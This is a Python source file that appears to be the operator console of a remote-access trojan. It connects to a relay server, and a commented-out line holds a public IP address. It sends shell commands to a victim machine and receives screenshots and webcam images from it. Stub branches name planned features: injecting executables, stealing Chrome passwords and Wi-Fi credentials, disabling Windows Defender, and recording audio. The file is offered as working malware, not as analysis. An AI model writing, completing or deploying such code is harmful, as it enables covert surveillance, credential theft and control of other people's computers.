import socket
import struct


bridge = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#bridge.connect(('45.80.148.246',9999))
bridge.connect(('localhost',9999))
bridge.send(b"master")
while True:

    command = input("cmd >")

    bytestream = struct.pack(f"{len(command)}s",command.encode()) # 5
    bridge.send(str(struct.calcsize("s")*len(command)).encode())
    bridge.send(bytestream)

    if command == "screenshot":
        datasize = int(bridge.recv(1024).decode())
        chunk = 1024
        data = b''
        while len(data) < datasize:
            data += bridge.recv(chunk)
        with open("screenshot.png","wb") as f:
            f.write(data)

    elif command == "camera capture":
        datasize = int(bridge.recv(1024).decode())
        chunk = 1024
        data = b''
        while len(data) < datasize:
            data += bridge.recv(chunk)
        with open("camera.jpg","wb") as f:
            f.write(data)

    elif "inject " in command: #inject run.exe
        pass
    elif "retreive " in command: #retreive pp.exe
        pass
    elif command == "fubit malware": #get chrome password
        pass
    elif command == "crack wifi": # get wifi informations (past data too)
        pass
    elif "defender" in command: # denfender activate defender disactivate
        active = command.replace("defender ","")
        if active == "activate":
            pass
        else:
            pass
    elif "sound record" in command:# sound record 15
        duration = int(command.replace("sound record ",""))
        
    elif command == "info":
        pass

    
    else:
        # receive the response
        size = bridge.recv(1024)
        response = bridge.recv(int(size.decode()))
        unpackedresponse = struct.unpack(f"{round(int(size.decode())/struct.calcsize('s'))}s",response)
        print(unpackedresponse[0].decode())
